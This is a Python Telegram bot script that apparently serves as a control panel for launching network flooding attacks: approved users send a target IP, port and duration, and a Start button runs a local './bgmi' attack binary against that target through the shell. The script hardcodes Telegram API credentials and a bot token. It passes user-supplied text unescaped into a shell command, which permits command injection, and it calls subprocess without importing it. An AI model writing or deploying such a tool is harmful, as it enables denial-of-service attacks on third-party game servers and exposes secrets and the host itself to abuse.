
from telethon import TelegramClient, events, Button
import sqlite3

# Database setup
conn = sqlite3.connect('users.db')
c = conn.cursor()

# Create users table if it doesn't exist
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, credits INTEGER DEFAULT 0)''')
conn.commit()

Apid = 22157690
Apihash = "819a20b5347be3a190163fff29d59d81"
tken = "7483201528:AAGLZzUEMYYN-wYmYUUwD8eVOQyiflG8-d4"
SEMXUSER = 2092103173

client = TelegramClient('R5O60D', Apid, Apihash).start(bot_token=tken)

async def is_authorized(user_id):
    """ Check if the user is in the database. """
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return c.fetchone() is not None

@client.on(events.NewMessage(pattern=r'#b (\S+) (\d+) (\d+)'))
async def handle_bgmi(event):
    user_id = event.sender_id
    print(f"Received command from user_id: {user_id}")  # Debug print
    if not await is_authorized(user_id):
        await event.reply("**You are not authorized to use this command.**")
        print("User is not authorized.")  # Debug print
        return

    target, port, time = event.pattern_match.groups()
    print(f"Target: {target}, Port: {port}, Time: {time}")  # Debug print

    # Send inline buttons
    buttons = [
        [Button.inline("Start", data=f'start_{target}_{port}_{time}'),
         Button.inline("Stop", data=f'stop_{target}_{port}_{time}')]
    ]
    
    await event.reply("Control BGMI execution:", buttons=buttons)
    print("Buttons sent.")  # Debug print


@client.on(events.CallbackQuery(pattern=b'start_(\S+)_(\d+)_(\d+)'))
async def start_bgmi(event):
    target, port, time = event.data.decode().split('_')[1:]

    command = f'./bgmi {target} {port} {time} 200'

    # Run the command asynchronously
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await event.answer("BGMI started.", alert=True)
    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)

@client.on(events.CallbackQuery(pattern=b'stop_(\S+)_(\d+)_(\d+)'))
async def stop_bgmi(event):
    target, port, time = event.data.decode().split('_')[1:]

    command_pattern = f'./bgmi {target} {port} {time} 200'

    try:
        # Stop the bgmi command by using pkill with a pattern match
        subprocess.Popen(f'pkill -f "{command_pattern}"', shell=True)
        await event.answer("BGMI process stopped.", alert=True)
    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)


@client.on(events.NewMessage(pattern='/add'))
async def add(event):
    if event.sender_id != SEMXUSER:
        await event.reply("**You are not authorized to use this command.**")
        return
    try:
        _, Infouser = event.message.message.split()
        user_id = Infouser if Infouser.isdigit() else None
        if user_id is None:
            user = await client.get_entity(Infouser)
            user_id = user.id
        c.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, Infouser))
        conn.commit()
        await event.reply(f"**Added {Infouser} to authorized users.**")
    except Exception as e:
        await event.reply(f"Error: {str(e)}")

@client.on(events.NewMessage(pattern='/remove'))
async def remove(event):
    if event.sender_id != SEMXUSER:
        await event.reply("**You are not authorized to use this command.**")
        return
    try:
        _, Infouser = event.message.message.split()
        user_id = Infouser if Infouser.isdigit() else None
        if user_id is None:
            user = await client.get_entity(Infouser)
            user_id = user.id
        c.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
        conn.commit()
        await event.reply(f"**Removed {Infouser} from authorized users.**")
    except Exception as e:
        await event.reply(f"Error: {str(e)}")

client.start()
client.run_until_disconnected()
  
